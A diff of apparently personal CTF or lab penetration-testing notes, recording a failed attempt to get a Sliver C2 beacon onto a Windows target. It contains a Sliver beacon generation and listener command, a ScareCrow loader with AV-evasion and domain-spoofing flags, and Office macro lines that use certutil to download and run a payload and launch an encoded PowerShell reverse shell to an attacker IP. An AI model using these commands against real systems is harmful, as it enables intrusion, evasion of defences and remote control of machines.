@@ -22,7 +22,7 @@ Credentials:
 #### Machine Connects to list and reason:
 
 [[]] - Reason X
-
+└─$ iconv -f ASCII -t UTF-16LE psrev.txt | base64 | tr -d "\n"
 ## Data Collected
 
 #### Credentials
@@ -104,4 +104,31 @@ ITWORKS.png
 But no beacon or session.
 nobaconorsausage.png
 
+```bash
+iconv -f ASCII -t UTF-16LE psrev.txt | base64 | tr -d "\n"
+```
 
+```bash
+generate beacon --mtls  192.168.45.173:4445 --arch amd64 --os windows --save /tmp/sliver.bin -f shellcode -G
+
+
+/opt/ScareCrow/ScareCrow -I /tmp/sliver.bin  -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
+
+GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
+
+upx 
+
+mtls -L 192.168.45.173 -l 4445
+```
+
+Tried `C:\Windows\Temp`, but I probably did not have permissions as this is most probably a later Windows 10 machine, I also add simple powershell reverse shell just because it is a CTF so more attempt in one go the better.
+```vb
+Shell("certutil.exe -urlcache -split -f 'http://192.168.45.173/install.exe' 'C:\programdata\install.exe'")
+Shell("C:\programdata\install.exe")
+Shell("powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADQANQAuADEANwAzACcALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA")
+```
+
+I aloso may have failed as I also add the event when the application is closed which may have over written the sliver beacon
+
+
+sadness.png
